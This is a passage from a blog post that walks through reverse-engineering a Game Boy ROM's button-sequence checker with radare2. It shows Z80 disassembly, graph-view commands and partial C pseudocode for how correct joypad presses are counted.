</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e2e</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e2f</span>    <span class="no">e602</span>         <span class="no">and</span> <span class="mi">0x02</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e31</span>    <span class="mi">2003</span>         <span class="no">jr</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x03</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e33</span>    <span class="no">c35c0e</span>       <span class="no">jp</span> <span class="no">loc.00000e5c</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000e36</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e39</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e3a</span>    <span class="no">fe03</span>         <span class="no">cp</span> <span class="mi">0x03</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e3c</span>    <span class="no">ca4d0e</span>       <span class="no">jp</span> <span class="no">Z</span><span class="p">,</span> <span class="mi">0x0e4d</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e3f</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e42</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e43</span>    <span class="no">fe07</span>         <span class="no">cp</span> <span class="mi">0x07</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e45</span>    <span class="no">c2540e</span>       <span class="no">jp</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x0e54</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e48</span>    <span class="mi">1803</span>         <span class="no">jr</span> <span class="mi">0x03</span> <span class="err">;</span> <span class="p">(</span><span class="no">loc.00000e2b</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e4a</span>    <span class="no">c3540e</span>       <span class="no">jp</span> <span class="mi">0x0e54</span> <span class="err">;</span> <span class="p">(</span><span class="no">loc.00000e2b</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000e4d</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e50</span>    <span class="mi">34</span>           <span class="no">inc</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e51</span>    <span class="no">c38a0e</span>       <span class="no">jp</span> <span class="no">loc.00000e8a</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000e54</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e57</span>    <span class="mi">3600</span>         <span class="no">ld</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x00</span>
</span><span class='line'><span class="err">\</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e59</span>    <span class="no">c38a0e</span>       <span class="no">jp</span> <span class="no">loc.00000e8a</span>
</span><span class='line'><span class="err">|-</span> <span class="nf">loc.00000e5c</span> <span class="mi">95</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000e5c</span>    <span class="mi">21</span><span class="no">a2c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a2</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e5f</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e60</span>    <span class="no">e610</span>         <span class="no">and</span> <span class="mi">0x10</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e62</span>    <span class="mi">2003</span>         <span class="no">jr</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x03</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e64</span>    <span class="no">c38a0e</span>       <span class="no">jp</span> <span class="no">loc.00000e8a</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000e67</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e6a</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e6b</span>    <span class="no">fe0a</span>         <span class="no">cp</span> <span class="mi">0x0a</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e6d</span>    <span class="no">ca7e0e</span>       <span class="no">jp</span> <span class="no">Z</span><span class="p">,</span> <span class="mi">0x0e7e</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e70</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e73</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e74</span>    <span class="no">fe0b</span>         <span class="no">cp</span> <span class="mi">0x0b</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e76</span>    <span class="no">c2850e</span>       <span class="no">jp</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x0e85</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e79</span>    <span class="mi">1803</span>         <span class="no">jr</span> <span class="mi">0x03</span> <span class="err">;</span> <span class="p">(</span><span class="no">loc.00000e5c</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e7b</span>    <span class="no">c3850e</span>       <span class="no">jp</span> <span class="mi">0x0e85</span> <span class="err">;</span> <span class="p">(</span><span class="no">loc.00000e5c</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000e7e</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e81</span>    <span class="mi">34</span>           <span class="no">inc</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e82</span>    <span class="no">c38a0e</span>       <span class="no">jp</span> <span class="no">loc.00000e8a</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000e85</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>   <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e88</span>    <span class="mi">3600</span>         <span class="no">ld</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x00</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>        <span class="err">;</span> <span class="nl">XREFS:</span> <span class="nf">JMP</span> <span class="mi">0x00000dbe</span>  <span class="no">JMP</span> <span class="mi">0x00000dc6</span>  <span class="no">JMP</span> <span class="mi">0x00000def</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>        <span class="err">;</span> <span class="nl">XREFS:</span> <span class="nf">JMP</span> <span class="mi">0x00000df7</span>  <span class="no">JMP</span> <span class="mi">0x00000e20</span>  <span class="no">JMP</span> <span class="mi">0x00000e28</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>        <span class="err">;</span> <span class="nl">XREFS:</span> <span class="nf">JMP</span> <span class="mi">0x00000e51</span>  <span class="no">JMP</span> <span class="mi">0x00000e59</span>  <span class="no">JMP</span> <span class="mi">0x00000e82</span>
</span><span class='line'><span class="err">|</span>  <span class="err">|</span>        <span class="err">;</span> <span class="nl">XREFS:</span> <span class="nf">JMP</span> <span class="mi">0x00000e64</span>
</span><span class='line'><span class="err">|-</span> <span class="nf">loc.00000e8a</span> <span class="mi">49</span>
</span><span class='line'><span class="err">|</span> <span class="err">-`------&gt;</span> <span class="err">0</span><span class="nf">x00000e8a</span>    <span class="mi">21</span><span class="no">a2c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a2</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e8d</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e8e</span>    <span class="no">e620</span>         <span class="no">and</span> <span class="mi">0x20</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e90</span>    <span class="mi">2003</span>         <span class="no">jr</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x03</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e92</span>    <span class="no">c3bb0e</span>       <span class="no">jp</span> <span class="no">loc.00000ebb</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000e95</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e98</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e99</span>    <span class="no">fe08</span>         <span class="no">cp</span> <span class="mi">0x08</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000e9b</span>    <span class="no">caac0e</span>       <span class="no">jp</span> <span class="no">Z</span><span class="p">,</span> <span class="mi">0x0eac</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000e9e</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000ea1</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000ea2</span>    <span class="no">fe09</span>         <span class="no">cp</span> <span class="mi">0x09</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000ea4</span>    <span class="no">c2b30e</span>       <span class="no">jp</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x0eb3</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000ea7</span>    <span class="mi">1803</span>         <span class="no">jr</span> <span class="mi">0x03</span> <span class="err">;</span> <span class="p">(</span><span class="no">loc.00000e8a</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000ea9</span>    <span class="no">c3b30e</span>       <span class="no">jp</span> <span class="mi">0x0eb3</span> <span class="err">;</span> <span class="p">(</span><span class="no">loc.00000e8a</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000eac</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000eaf</span>    <span class="mi">34</span>           <span class="no">inc</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000eb0</span>    <span class="no">c3f60e</span>       <span class="no">jp</span> <span class="no">loc.00000ef6</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000eb3</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000eb6</span>    <span class="mi">3600</span>         <span class="no">ld</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x00</span>
</span><span class='line'><span class="err">\</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000eb8</span>    <span class="no">c3f60e</span>       <span class="no">jp</span> <span class="no">loc.00000ef6</span>
</span><span class='line'><span class="err">|-</span> <span class="nf">loc.00000ebb</span> <span class="mi">43</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000ebb</span>    <span class="mi">21</span><span class="no">a2c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a2</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000ebe</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000ebf</span>    <span class="no">e680</span>         <span class="no">and</span> <span class="mi">0x80</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000ec1</span>    <span class="mi">2003</span>         <span class="no">jr</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x03</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000ec3</span>    <span class="no">c3e60e</span>       <span class="no">jp</span> <span class="no">loc.00000ee6</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000ec6</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000ec9</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000eca</span>    <span class="no">fe0c</span>         <span class="no">cp</span> <span class="mi">0x0c</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000ecc</span>    <span class="no">c2de0e</span>       <span class="no">jp</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x0ede</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000ecf</span>    <span class="mi">1803</span>         <span class="no">jr</span> <span class="mi">0x03</span> <span class="err">;</span> <span class="p">(</span><span class="no">loc.00000ebb</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000ed1</span>    <span class="no">c3de0e</span>       <span class="no">jp</span> <span class="mi">0x0ede</span> <span class="err">;</span> <span class="p">(</span><span class="no">loc.00000ebb</span><span class="p">)</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000ed4</span>    <span class="no">cd0002</span>       <span class="no">call</span> <span class="mi">0x0200</span>
</span><span class='line'><span class="err">|</span>         <span class="err">&gt;</span>    <span class="err">0</span><span class="nf">x00000200</span><span class="p">()</span> <span class="err">;</span> <span class="no">main</span><span class="err">+</span><span class="mi">176</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000ed7</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000eda</span>    <span class="mi">34</span>           <span class="no">inc</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000edb</span>    <span class="no">c3f60e</span>       <span class="no">jp</span> <span class="no">loc.00000ef6</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000ede</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000ee1</span>    <span class="mi">3600</span>         <span class="no">ld</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x00</span>
</span><span class='line'><span class="err">\</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000ee3</span>    <span class="no">c3f60e</span>       <span class="no">jp</span> <span class="no">loc.00000ef6</span>
</span><span class='line'><span class="err">|-</span> <span class="nf">loc.00000ee6</span> <span class="mi">27</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000ee6</span>    <span class="mi">21</span><span class="no">a2c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a2</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000ee9</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000eea</span>    <span class="no">e640</span>         <span class="no">and</span> <span class="mi">0x40</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000eec</span>    <span class="mi">2003</span>         <span class="no">jr</span> <span class="no">nZ</span><span class="p">,</span> <span class="mi">0x03</span>
</span><span class='line'><span class="err">|</span> <span class="err">========&lt;</span> <span class="err">0</span><span class="nf">x00000eee</span>    <span class="no">c3f60e</span>       <span class="no">jp</span> <span class="no">loc.00000ef6</span>
</span><span class='line'><span class="err">|</span> <span class="err">--------&gt;</span> <span class="err">0</span><span class="nf">x00000ef1</span>    <span class="mi">21</span><span class="no">a0c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a0</span>
</span><span class='line'><span class="err">|</span>      <span class="err">|</span>    <span class="err">0</span><span class="nf">x00000ef4</span>    <span class="mi">3600</span>         <span class="no">ld</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span><span class="p">,</span> <span class="mi">0x00</span>
</span><span class='line'><span class="err">|-</span> <span class="nf">loc.00000ef6</span> <span class="mi">11</span>
</span><span class='line'><span class="err">|</span> <span class="err">-----`--&gt;</span> <span class="err">0</span><span class="nf">x00000ef6</span>    <span class="mi">21</span><span class="no">a2c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a2</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000ef9</span>    <span class="mi">7</span><span class="no">e</span>           <span class="no">ld</span> <span class="no">a</span><span class="p">,</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000efa</span>    <span class="mi">21</span><span class="no">a1c0</span>       <span class="no">ld</span> <span class="no">hl</span><span class="p">,</span> <span class="mi">0xc0a1</span>
</span><span class='line'><span class="err">|</span>           <span class="err">0</span><span class="nf">x00000efd</span>    <span class="mi">77</span>           <span class="no">ld</span> <span class="err">[</span><span class="no">hl</span><span class="err">]</span><span class="p">,</span> <span class="no">a</span>
</span><span class='line'><span class="err">\</span>           <span class="err">0</span><span class="nf">x00000efe</span>    <span class="no">c36f0d</span>       <span class="no">jp</span> <span class="no">checker_loop</span>
</span><span class='line'><span class="err">\</span>           <span class="err">0</span><span class="nf">x00000f01</span>    <span class="no">c9</span>           <span class="no">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>Yikes! This is a long function. With r2 we have a lot of tools at our disposal
though, and we can use the graph view to get a better high-level understanding
of the code.</p>

<p>We can load up a graph visualization with either <code>VV</code> for an ascii view, or a
graphviz view with <code>ag</code>. I like to use the graphviz output with xdot.</p>

<p><code>[0x00000d6f]&gt; ag $$ | xdot</code></p>

<p>And we get a nice graph like this.  I have some annotations on mine, from
reversing the function myself.
This is helpful for looking at the overall way the function works. It seems to
have a cascading check, like</p>

<p><code>if(){}else if{}else if{}else{}</code></p>

<p>type structure, which makes sense for value and index checking.</p>

<p><img src="http://i.imgur.com/3qYEp5a.png" alt="biggraph.png" /></p>

<p>So, after some analysis, and guessing, we can figure the following.
There is some debouncing/not expected to be perfect for clock cycles for button
presses, so there must be tolerance for <code>0xFF00</code> to be the same for multiple
cycles, or to be 0 with no penalty.</p>

<p>This means that the previous value must be stored somewhere, and that checks
for empty press is somewhere too. From looking at the assembly, and the graph, I
can piece together this as pseudocode.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">void</span> <span class="nf">main_checker</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="n">byte</span> <span class="n">reg_E</span><span class="p">;</span>
</span><span class='line'>  <span class="n">byte</span> <span class="n">reg_A</span><span class="p">;</span>
</span><span class='line'>  <span class="n">byte</span><span class="o">*</span> <span class="n">curr_press</span> <span class="o">=</span> <span class="mh">0xc0a2</span><span class="p">;</span>
</span><span class='line'>  <span class="n">byte</span><span class="o">*</span> <span class="n">prev_press</span> <span class="o">=</span> <span class="mh">0xc0a1</span><span class="p">;</span>
</span><span class='line'>  <span class="n">byte</span><span class="o">*</span> <span class="n">num_correct</span> <span class="o">=</span> <span class="mh">0xc0a0</span><span class="p">;</span>
</span><span class='line'><span class="nl">begin</span><span class="p">:</span>
</span><span class='line'>  <span class="n">reg_E</span> <span class="o">=</span> <span class="n">load_joypad_to_e</span><span class="p">();</span>
</span><span class='line'>  <span class="o">*</span><span class="n">curr_press</span> <span class="o">=</span> <span class="n">reg_E</span><span class="p">;</span>
</span><span class='line'>  <span class="n">reg_A</span> <span class="o">=</span> <span class="o">*</span><span class="n">prev_press</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">curr_press</span> <span class="o">==</span> <span class="o">*</span><span class="n">prev_press</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">begin</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">curr_press</span> <span class="o">==</span> <span class="mh">0x00</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">begin</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">do</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">curr_press</span> <span class="o">==</span> <span class="mh">0x01</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="n">num_correct</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">||</span> <span class="o">*</span><span class="n">num_correct</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">num_correct</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="o">*</span><span class="n">num_correct</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span>
